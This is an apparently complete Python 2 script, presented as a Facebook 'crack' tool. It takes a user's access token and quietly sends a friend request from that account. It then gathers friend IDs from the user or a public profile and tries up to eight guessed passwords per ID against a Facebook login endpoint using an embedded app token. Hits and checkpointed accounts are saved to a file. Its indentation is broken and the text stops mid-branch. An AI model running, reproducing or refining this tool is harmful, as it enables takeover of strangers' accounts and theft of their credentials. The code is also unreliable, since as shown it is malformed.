#!/usr/bin/python2
#coding=utf-8
import os, sys, time, datetime, random, hashlib, re, threading, json, getpass, urllib, cookielib
from multiprocessing.pool import ThreadPool
try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')

try:
    import bs4
except ImportError:
    os.system('pip2 install bs4')

try:
    import requests
except ImportError:
    os.system('pip2 install requests')
    os.system('python2 Speed.py')

from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]

def keluar():
    print '[!] Exit'
    os.sys.exit()


def acak(x):
    w = 'mhkbpcP'
    d = ''
    for i in x:
        d += '!' + w[random.randint(0, len(w) - 1)] + i

    return cetak(d)


def cetak(x):
    w = 'mhkbpcP'
    for i in w:
        j = w.index(i)
        x = x.replace('!%s' % i, '%s;' % str(31 + j))

    x += ''
    x = x.replace('!0', '')
    sys.stdout.write(x + '\n')


def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.06)


logo = """
\033[1;92m                                                       
      
░█████╗░██████╗░██████╗░░█████╗░██████╗░
██╔══██╗██╔══██╗██╔══██╗██╔══██╗██╔══██╗
███████║██████╔╝██████╦╝███████║██████╦╝
██╔══██║██╔══██╗██╔══██╗██╔══██║██╔══██╗
██║░░██║██║░░██║██████╦╝██║░░██║██████╦╝
╚═╝░░╚═╝╚═╝░░╚═╝╚═════╝░╚═╝░░╚═╝╚═════╝░                                                     
                                                     
\x1b[1;93m--------------------------------------------------------------
\x1b[1;92m➣ NAMA 💉 ARBAB ALI MEMON
\x1b[1;91m➣ INFO 💉 HACKER 0.128R.S
\x1b[1;93m➣ SPED 💉 3.0PYTHON LOVER
\x1b[1;95m➣ NMBR 💉 03003023263:9PM
\x1b[1;93m--------------------------------------------------------------
\033[1;91m       🔷🔷🔷———————————————————————————————🔷🔷🔷
\033[1;91m      __  __            __   _           
\033[1;91m     |  \/  |   __ _   / _| (_)   __ _   
\033[1;91m       | |\/| |  / _` | | |_  | |  / _` |  
\033[1;91m       | |  | | | (_| | |  _| | | | (_| |  
\033[1;91m     |_|  |_|  \__,_| |_|   |_|  \__,_|  GANGE
                                                   
\033[1;91m       🔷🔷🔷———————————————————————————————🔷🔷🔷
"""
def tik():
    titik = [
     '.   ', '..  ', '... ']
    for o in titik:
        print '\r Tunggu' + o,
        sys.stdout.flush()
        time.sleep(1)


back = 0
berhasil = []
threads = []
gagal = []
idlist = []
cekpoint = []
oks = []
cp = []
id = []
cpb = []
threads = []
sucessful = []
checkpoint = []
cp = []
ok = []
br.addheaders = []

def lisensi():
    os.system('clear')
    login()


def login():
    os.system('clear')
    print logo
    time.sleep(0.01)
    print '\033[1;91m[1]\033[1;92mLogin With Facebook Access Token '
    time.sleep(0.01)
    print '\033[1;95m[0]\033[1;31mExit'
    time.sleep(0.01)
    print '\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    time.sleep(0.01)
    pilih_login()


def pilih_login():
    peak = raw_input('\033[1;93mSelect an Option 👉')
    if peak == '':
        print 'Salah'
        pilih_login()
    elif peak == '1':
        tokenz()
    elif unikers == '0':
        os.system('rm -rf login.txt')
        keluar()
    else:
        print 'Wrong'
        pilih()


def tokenz():
    os.system('clear')
    print logo
    toket = raw_input('\nEnter Token 👉👉 ')
    try:
        otw = requests.get('https://graph.facebook.com/me?access_token=' + toket)
        a = json.loads(otw.text)
        nama = a['name']
        zedd = open('login.txt', 'w')
        zedd.write(toket)
        zedd.close()
        jalan('\nLogin Berhasil')
        os.system('xdg-open https://www.facebook.com/groups/1534351163432432/?ref=share')
        requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token=' + toket)
        menu()
    except KeyError:
        print 'Wrong'


def menu():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        os.system('clear')
        print 'Token invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    try:
        otw = requests.get('https://graph.facebook.com/me?access_token=' + toket)
        a = json.loads(otw.text)
        nama = a['name']
        id = a['id']
    except KeyError:
        os.system('clear')
        print 'Looks like your account hit the checkpoint'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    except requests.exceptions.ConnectionError:
        print 'No connection'
        keluar()

    os.system('clear')
    print logo
    time.sleep(0.01)
    print '                          ACCOUNT INFORMATION'
    time.sleep(0.01)
    print '\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    time.sleep(0.01)
    print 'Nama \xe2\x80\xa2 ' + nama + ' '
    time.sleep(0.01)
    print 'ID   \xe2\x80\xa2 ' + id + ' '
    time.sleep(0.01)
    print '\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    time.sleep(0.01)
    print '1.) Crack FB '
    time.sleep(0.01)
    print '0.) Back            '
    time.sleep(0.01)
    print '\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    time.sleep(0.01)
    pilih()


def pilih():
    unikers = raw_input('\nchoose \xe2\x80\xa2 ')
    if unikers == '':
        print 'Fill in the correct'
        pilih()
    elif unikers == '1':
        mbf()
    elif unikers == '0':
        jalan('Delete tokens')
        os.system('rm -rf login.txt')
        keluar()
    else:
        print 'Fill in the correct'
        choose()


def mbf():
    global toket
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print 'Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    print
    time.sleep(0.01)
    print '1.) Crack Friend'
    time.sleep(0.01)
    print '2.) Crack Public '
    time.sleep(0.01)
    print  '0.) Back'
    time.sleep(0.01)
    print '\x1b[1;97 \xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    time.sleep(0.01)
    pilih_mbf()


def pilih_mbf():
    global oks
    peak = raw_input('\nSelect \xe2\x80\xa2 ')
    if peak == '':
        print 'Fill in the correct'
        mbf()
    else:
        if peak == '1':
            os.system('clear')
            print logo
            jalan('Taking ID')
            r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
            z = json.loads(r.text)
            for s in z['data']:
                id.append(s['id'])

        elif peak == '2':
            os.system('clear')
            print logo
            idt = raw_input('PUBLIC ID \xe2\x80\xa2 ')
            try:
                jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
                op = json.loads(jok.text)
                print 'Nama \xe2\x80\xa2 ' + op['name']
            except KeyError:
                print 'ID No.'
                raw_input('\nPress Enter To Return')
                mbf()

            jalan('Taking ID')
            r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
            z = json.loads(r.text)
            for i in z['data']:
                id.append(i['id'])

        elif peak == '0':
            menu()
        else:
            print 'Fill in the correct'
            mbf()
        print 'ID Obtained \xe2\x80\xa2 ' + str(len(id))
        jalan('Wait')
        titik = ['.   ', '..  ', '... ']
        for o in titik:
            print '\rCrack' + o,
            sys.stdout.flush()
            time.sleep(1)

    print
    
    jalan('\nEnter 07 PASSWORD REG ARBAB ALI MEMON')
    pass1 = raw_input('Password 1 \xe2\x80\xa2 ')
    pass2 = raw_input('Password 2 \xe2\x80\xa2 ')
    pass3 = raw_input('Password 3 \xe2\x80\xa2 ')
    pass4 = raw_input('Password 4 \xe2\x80\xa2 ')
    pass5 = raw_input('Password 5 \xe2\x80\xa2 ')
    pass6 = raw_input('Password 6 \xe2\x80\xa2 ')
    pass7 = raw_input('Password 7 \xe2\x80\xa2 ')
    print '\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    print '              IF YOU WANT TO STOP PRESS CTRL THEN Z'
    print '                        MAFIA GANGE'
    print '\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\n'

    def main(arg):
        user = arg
        try:
            os.mkdir('out')
        except OSError:
            pass
        
	try:	
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)												
			b = json.loads(a.text)												
			pass1 											
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			q = json.load(data)												
			if 'access_token' in q:
				x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				z = json.loads(x.text)
				print '\x1b[1;94m[  ✓  ] \x1b[1;92mArbab-Hack100%'											
				print '\x1b[1;94m[•⚔•] \x1b[1;91mName \x1b[1;91m    ✯ \x1b[1;92m' + b['name']											
				print '\x1b[1;94m[•⚔•] \x1b[1;91mID \x1b[1;91m      ✯ \x1b[1;92m' + user											
				print '\x1b[1;94m[•⚔•] \x1b[1;91mPassword \x1b[1;91m✯ \x1b[1;92m' + pass1 + '\n'											
				oks.append(user+pass1)
                        else:
			        if 'www.facebook.com' in q["error_msg"]:
				    print '\x1b[1;94m[ ❥ ] \x1b[1;94mCheckpoint'
				    print '\x1b[1;94m[•⚔•] \x1b[1;94mName \x1b[1;94m    ✯ \x1b[1;95m' + b ['name']
				    print '\x1b[1;94m[•⚔•] \x1b[1;94mID \x1b[1;94m      ✯ \x1b[1;95m' + user
				    print '\x1b[1;94m[•⚔•] \x1b[1;94mPassword \x1b[1;94m✯ \x1b[1;95m' + pass1 + '\n'
				    cek = open("out/super_cp.txt", "a")
				    cek.write("ID:" +user+ " Pw:" +pass1+"\n")
				    cek.close()
				    cekpoint.append(user+pass1)
                                else:
				    pass2 										
                                    data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			            q = json.load(data)												
			            if 'access_token' in q:	
				            x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				            z = json.loads(x.text)
				            print '\x1b[1;94m[  ✓  ] \x1b[1;92mArbab-Hack100%'											
				            print '\x1b[1;94m[•⚔•] \x1b[1;91mName \x1b[1;91m    ✯ \x1b[1;92m' + b['name']											
				            print '\x1b[1;94m[•⚔•] \x1b[1;91mID \x1b[1;91m      ✯ \x1b[1;92m' + user								
				            print '\x1b[1;94m[•⚔•] \x1b[1;91mPassword \x1b[1;91m✯ \x1b[1;92m' + pass2 + '\n'											
				            oks.append(user+pass2)
                                    else:
			                   if 'www.facebook.com' in q["error_msg"]:
				               print '\x1b[1;94m[ ❥ ] \x1b[1;94mCheckpoint'
				               print '\x1b[1;94m[•⚔•] \x1b[1;94mName \x1b[1;94m    ✯ \x1b[1;95m' + b['name']
				               print '\x1b[1;94m[•⚔•] \x1b[1;94mID \x1b[1;94m      ✯ \x1b[1;95m' + user
				               print '\x1b[1;94m[•⚔•] \x1b[1;94mPassword \x1b[1;94m✯ \x1b[1;95m' + pass2 + '\n'
				               cek = open("out/super_cp.txt", "a")
				               cek.write("ID:" +user+ " Pw:" +pass2+"\n")
				               cek.close()
				               cekpoint.append(user+pass2)								
				           else:											
					       pass3  			
					       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")										
					       q = json.load(data)										
					       if 'access_token' in q:	
						       x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                       z = json.loads(x.text)
						       print '\x1b[1;94m[  ✓  ] \x1b[1;92mArbab-Hack100%'								
						       print '\x1b[1;94m[•⚔•] \x1b[1;91mName \x1b[1;91m    ✯ \x1b[1;92m' + b['name']									
						       print '\x1b[1;94m[•⚔•] \x1b[1;91mID \x1b[1;91m      ✯ \x1b[1;92m' + user							
						       print '\x1b[1;94m[•⚔•] \x1b[1;91mPassword \x1b[1;91m✯ \x1b[1;92m' + pass3 + '\n'									
						       oks.append(user+pass3)
                                               else:
			                               if 'www.facebook.com' in q["error_msg"]:
				                           print '\x1b[1;94m[ ❥ ] \x1b[1;94mCheckpoint'
				                           print '\x1b[1;94m[•⚔•] \x1b[1;94mName \x1b[1;94m    ✯ \x1b[1;95m' + b['name']
				                           print '\x1b[1;94m[•⚔•] \x1b[1;94mID \x1b[1;94m      ✯ \x1b[1;95m' + user
				                           print '\x1b[1;94m[•⚔•] \x1b[1;94mPassword \x1b[1;94m✯ \x1b[1;95m' + pass3 + '\n'
				                           cek = open("out/super_cp.txt", "a")
				                           cek.write("ID:" +user+ " Pw:" +pass3+"\n")
				                           cek.close()
				                           cekpoint.append(user+pass3)									
					               else:										
						           pass4 										
			                                   data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			                                   q = json.load(data)												
			                                   if 'access_token' in q:		
						                   x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                   z = json.loads(x.text)
				                                   print '\x1b[1;94m[  ✓  ] \x1b[1;92mArbab-Hack100%'											
				                                   print '\x1b[1;94m[•⚔•] \x1b[1;91mName \x1b[1;91m    ✯ \x1b[1;92m' + b['name']											
				                                   print '\x1b[1;94m[•⚔•] \x1b[1;91mID \x1b[1;91m      ✯ \x1b[1;92m' + user											
				                                   print '\x1b[1;94m[•⚔•] \x1b[1;91mPassword \x1b[1;91m✯ \x1b[1;92m' + pass4 + '\n'											
				                                   oks.append(user+pass4)
                                                           else:
			                                           if 'www.facebook.com' in q["error_msg"]:
				                                       print '\x1b[1;94m[ ❥ ] \x1b[1;94mCheckpoint'
				                                       print '\x1b[1;94m[•⚔•] \x1b[1;94mName \x1b[1;94m    ✯ \x1b[1;95m' + b['name']
				                                       print '\x1b[1;94m[•⚔•] \x1b[1;94mID \x1b[1;94m      ✯ \x1b[1;95m' + user
				                                       print '\x1b[1;94m[•⚔•] \x1b[1;94mPassword \x1b[1;94m✯ \x1b[1;95m' + pass4 + '\n'
				                                       cek = open("out/super_cp.txt", "a")
				                                       cek.write("ID:" +user+ " Pw:" +pass4+"\n")
				                                       cek.close()
				                                       cekpoint.append(user+pass4)					
					                           else:									
						                       pass5 						
						                       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")								
						                       q = json.load(data)								
						                       if 'access_token' in q:	
						                               x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                               z = json.loads(x.text)
						                               print '\x1b[1;94m[  ✓  ] \x1b[1;92mArbab-Hack100%'						
						                               print '\x1b[1;94m[•⚔•] \x1b[1;91mName \x1b[1;91m    ✯ \x1b[1;92m' + b['name']							
						                               print '\x1b[1;94m[•⚔•] \x1b[1;91mID \x1b[1;91m      ✯ \x1b[1;92m' + user					
						                               print '\x1b[1;94m[•⚔•] \x1b[1;91mPassword \x1b[1;91m✯ \x1b[1;92m' + pass5 + '\n'							
						                               oks.append(user+pass5)	
                                                                       else:
			                                                       if 'www.facebook.com' in q["error_msg"]:
				                                                   print '\x1b[1;94m[ ❥ ] \x1b[1;94mCheckpoint'
				                                                   print '\x1b[1;94m[•⚔•] \x1b[1;94mName \x1b[1;94m    ✯ \x1b[1;95m' + b['name']
				                                                   print '\x1b[1;94m[•⚔•] \x1b[1;94mID \x1b[1;94m      ✯ \x1b[1;95m' + user
				                                                   print '\x1b[1;94m[•⚔•] \x1b[1;94mPassword \x1b[1;94m✯ \x1b[1;95m' + pass5 + '\n'
				                                                   cek = open("out/super_cp.txt", "a")
				                                                   cek.write("ID:" +user+ " Pw:" +pass5+"\n")
				                                                   cek.close()
				                                                   cekpoint.append(user+pass5)					
						                               else:								
							                           pass6 											
			                                                           data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			                                                           q = json.load(data)												
			                                                           if 'access_token' in q:	
								                           x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                                           z = json.loads(x.text)
				                                                           print '\x1b[1;94m[  ✓  ] \x1b[1;92mArbab-Hack100%'											
				                                                           print '\x1b[1;94m[•⚔•] \x1b[1;91mName \x1b[1;91m    ✯ \x1b[1;92m' + b['name']											
				                                                           print '\x1b[1;94m[•⚔•] \x1b[1;91mID \x1b[1;91m      ✯ \x1b[1;92m' + user									
				                                                           print '\x1b[1;94m[•⚔•] \x1b[1;91mPassword \x1b[1;91m✯ \x1b[1;92m' + pass6 + '\n'											
				                                                           oks.append(user+pass6)
                                                                                   else:
			                                                                   if 'www.facebook.com' in q["error_msg"]:
				                                                               print '\x1b[1;94m[ ❥ ] \x1b[1;94mCheckpoint'
				                                                               print '\x1b[1;94m[•⚔•] \x1b[1;94mName \x1b[1;94m    ✯ \x1b[1;95m' + b['name']
				                                                               print '\x1b[1;94m[•⚔•] \x1b[1;94mID \x1b[1;94m      ✯ \x1b[1;95m' + user
				                                                               print '\x1b[1;94m[•⚔•] \x1b[1;94mPassword \x1b[1;94m✯ \x1b[1;95m' + pass6 + '\n'
				                                                               cek = open("out/super_cp.txt", "a")
				                                                               cek.write("ID:" +user+ " Pw:" +pass6+"\n")
				                                                               cek.close()
				                                                               cekpoint.append(user+pass6)	
						                                           else:							
								                               pass7 						
								                               data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")						
								                               q = json.load(data)						
								                               if 'access_token' in q:		
				                                                                       x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                                                       z = json.loads(x.text)
									                               print '\x1b[1;94m[  ✓  ] \x1b[1;92mArbab-Hack100%'					
									                               print '\x1b[1;94m[•⚔•] \x1b[1;91mName \x1b[1;91m    ✯ \x1b[1;92m' + b['name']					
									                               print '\x1b[1;94m[•⚔•] \x1b[1;91mID \x1b[1;91m      ✯ \x1b[1;92m' + user				
									                               print '\x1b[1;94m[•⚔•] \x1b[1;91mPassword \x1b[1;91m✯ \x1b[1;92m' + pass7 + '\n'					
									                               oks.append(user+pass7)
                                                                                               else:
			                                                                               if 'www.facebook.com' in q["error_msg"]:
				                                                                           print '\x1b[1;94m[ ❥ ] \x1b[1;94mCheckpoint'
				                                                                           print '\x1b[1;94m[•⚔•] \x1b[1;94mName \x1b[1;94m    ✯ \x1b[1;95m' + b['name']
				                                                                           print '\x1b[1;94m[•⚔•] \x1b[1;94mID \x1b[1;94m      ✯ \x1b[1;95m' + user
				                                                                           print '\x1b[1;94m[•⚔•] \x1b[1;94mPassword \x1b[1;94m✯ \x1b[1;95m' + pass7 + '\n'
				                                                                           cek = open("out/super_cp.txt", "a")
				                                                                           cek.write("ID:" +user+ " Pw:" +pass7+"\n")
				                                                                           cek.close()
				                                                                           cekpoint.append(user+pass7)           					
								                                       else:						
										                           pass8 = b['last_name'] + '786'											
			                                                                                   data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			                                                                                   q = json.load(data)												
			                                                                                   if 'access_token' in q:		
										                                   x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                                                                   z = json.loads(x.text)
				                                                                                   print '\x1b[1;94m[  ✓  ] \x1b[1;92mArbab-Hack100%'											
				                                                                                   print '\x1b[1;94m[•⚔•] \x1b[1;91mName \x1b[1;91m    ✯ \x1b[1;92m' + b['name']											
				                                                                                   print '\x1b[1;94m[•⚔•] \x1b[1;91mID \x1b[1;91m      ✯ \x1b[1;92m' + user										
				                                                                                   print '\x1b[1;94m[•⚔•] \x1b[1;91mPassword \x1b[1;91m✯ \x1b[1;92m' + pass8 + '\n'											
				                                                                                   oks.append(user+pass8)
                                                                                                           else:
			                                                                                           if 'www.facebook.com' in q["error_msg"]:
				                                                                                       print '\x1b[1;94m[ ❥ ] \x1b[1;94mCheckpoint'
				                                                                                       print '\x1b[1;94m[•⚔•] \x1b[1;94mName \x1b[1;94m    ✯ \x1b[1;95m' + b['name']
				                                                                                       print '\x1b[1;94m[•⚔•] \x1b[1;94mID \x1b[1;94m      ✯ \x1b[1;95m' + user
